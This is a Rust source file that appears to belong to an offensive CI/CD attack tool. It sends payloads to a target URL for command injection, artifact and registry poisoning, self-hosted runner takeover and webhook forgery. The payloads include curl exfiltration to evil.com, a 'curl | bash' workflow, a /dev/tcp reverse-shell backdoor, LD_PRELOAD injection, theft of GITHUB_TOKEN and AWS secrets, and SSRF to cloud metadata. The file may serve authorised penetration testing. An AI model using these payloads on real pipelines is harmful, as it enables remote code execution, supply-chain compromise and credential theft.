use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn inject(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} CI/CD Pipeline Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let injections = [
        (
            "PR title injection",
            r#"{"title":"$(id)","body":"$(cat /etc/passwd)"}"#,
        ),
        (
            "Branch name injection",
            r#"{"branch":"main;id;echo","commit":"$(whoami)"}"#,
        ),
        (
            "Commit message injection",
            r#"{"message":"fix: $(curl http://evil.com/$(id))"}"#,
        ),
        (
            "Issue title RCE",
            r#"{"title":"`id`","body":"`cat /etc/passwd`"}"#,
        ),
        (
            "Workflow trigger",
            r#"{"event":"push","branch":"; curl http://evil.com/$(id) #"}"#,
        ),
        (
            "Env var injection",
            r#"{"env":{"PATH":"/tmp:/usr/bin","LD_PRELOAD":"/tmp/evil.so"}}"#,
        ),
        (
            "Script injection",
            r#"{"script":"id\ncat /etc/passwd\ncurl http://evil.com/$(id)"}"#,
        ),
        (
            "YAML injection",
            r#"{"config":"run: [id, cat /etc/passwd, curl http://evil.com/$(id)]"}"#,
        ),
        (
            "Dockerfile injection",
            r#"{"dockerfile":"FROM alpine\nRUN id\nRUN cat /etc/passwd\nRUN curl http://evil.com/$(id)"}"#,
        ),
        (
            "Makefile injection",
            r#"{"makefile":"all:\n\tid\n\tcat /etc/passwd\n\tcurl http://evil.com/$(id)"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &injections {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = status == 200 || status == 201;
                let executed =
                    body.contains("uid=") || body.contains("root:") || body.contains("evil.com");
                let tag = if executed {
                    "EXECUTED".red().bold().to_string()
                } else if accepted {
                    "ACCEPTED".yellow().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if executed {
                    println!(
                        "    {} Output: {}",
                        ">".red().bold(),
                        body.chars().take(300).collect::<String>()
                    );
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    if !results.is_empty() {
        println!(
            "\n{} {} injection(s) executed — RCE confirmed!",
            "[!]".red().bold(),
            results.len()
        );
    } else {
        println!("\n{} No injections executed.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn poison(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} Artifact Poisoning", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let poisons = [
        (
            "Replace npm package",
            r#"{"package":"lodash","version":"4.17.21","registry":"https://evil.com/npm/"}"#,
        ),
        (
            "Replace PyPI package",
            r#"{"package":"requests","version":"2.28.0","index":"https://evil.com/pypi/"}"#,
        ),
        (
            "Replace Docker image",
            r#"{"image":"alpine","tag":"latest","registry":"evil.com"}"#,
        ),
        (
            "Replace Maven artifact",
            r#"{"group":"org.apache","artifact":"commons","repo":"https://evil.com/maven/"}"#,
        ),
        (
            "Replace Go module",
            r#"{"module":"github.com/gorilla/mux","version":"v1.8.0","proxy":"https://evil.com/goproxy/"}"#,
        ),
        (
            "Cache poisoning",
            r#"{"action":"poison_cache","key":"build-artifacts","value":"malicious_payload"}"#,
        ),
        (
            "Backdoor binary",
            r#"{"artifact":"release-binary","inject":"reverse_shell","target":"linux/amd64"}"#,
        ),
        (
            "Tamper checksum",
            r#"{"artifact":"package.tar.gz","checksum":"attacker_checksum","original":"legit_checksum"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &poisons {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let accepted = status == 200 || status == 201;
                let tag = if accepted {
                    "POISONED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accepted {
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    if !results.is_empty() {
        println!(
            "\n{} {} artifact(s) poisoned!",
            "[!]".red().bold(),
            results.len()
        );
    } else {
        println!("\n{} No artifacts poisoned.", "[-]".green().bold());
    }
    Ok(())
}

pub async fn runner(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} Self-Hosted Runner Takeover", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let attacks = [
        (
            "Register rogue runner",
            r#"{"action":"register","name":"evil-runner","labels":["self-hosted","linux"],"token":"stolen_registration_token"}"#,
        ),
        ("Steal runner token", r#"{"action":"get_runner_token"}"#),
        ("List runners", r#"{"action":"list_runners"}"#),
        (
            "Hijack job",
            r#"{"action":"claim_job","runner_id":"target_runner","job":"build"}"#,
        ),
        (
            "Inject workflow",
            r#"{"action":"create_workflow","repo":"target","content":"on: push\njobs:\n  pwn:\n    runs-on: self-hosted\n    steps:\n      - run: curl http://evil.com/shell | bash"}"#,
        ),
        (
            "Exfil secrets",
            r#"{"action":"exfil_secrets","runner":"target","secrets":["GITHUB_TOKEN","AWS_SECRET_ACCESS_KEY"]}"#,
        ),
        (
            "Persist backdoor",
            r#"{"action":"install_service","name":"ci-helper","command":"bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &attacks {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let success = body.contains("token")
                    || body.contains("runner")
                    || body.contains("success")
                    || status == 200;
                let tag = if success {
                    "SUCCESS".red().bold().to_string()
                } else {
                    "failed".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if success {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    if !results.is_empty() {
        println!(
            "\n{} {} runner attack(s) succeeded!",
            "[!]".red().bold(),
            results.len()
        );
    } else {
        println!("\n{} No runner attacks succeeded.", "[-]".green().bold());
    }
    Ok(())
}

pub async fn webhook(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Webhook Secret Extraction", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let tests = [
        (
            "No signature verify",
            r#"{"event":"push","data":"test","signature":""}"#,
        ),
        (
            "Weak signature",
            r#"{"event":"push","data":"test","signature":"sha1=0000000000000000000000000000000000000000"}"#,
        ),
        (
            "Timing attack",
            r#"{"event":"push","data":"test","signature":"sha256=0"}"#,
        ),
        (
            "Algorithm confusion",
            r#"{"event":"push","data":"test","signature":"none"}"#,
        ),
        (
            "Replay attack",
            r#"{"event":"push","data":"old_data","timestamp":"1","signature":"old_sig"}"#,
        ),
        (
            "Missing timestamp",
            r#"{"event":"push","data":"test","signature":"sha256=abc"}"#,
        ),
        (
            "SSRF via webhook URL",
            r#"{"url":"http://169.254.169.254/latest/meta-data/","event":"test"}"#,
        ),
        (
            "Webhook forgery",
            r#"{"event":"push","data":"{\"ref\":\"refs/heads/main\"}","signature":"forged"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &tests {
        match client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = body.contains("success")
                    || body.contains("ok")
                    || body.contains("processed")
                    || status == 200;
                let tag = if accepted {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accepted {
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    if !results.is_empty() {
        println!(
            "\n{} {} webhook attack(s) accepted!",
            "[!]".red().bold(),
            results.len()
        );
    } else {
        println!("\n{} All webhook attacks rejected.", "[-]".green().bold());
    }
    Ok(())
}
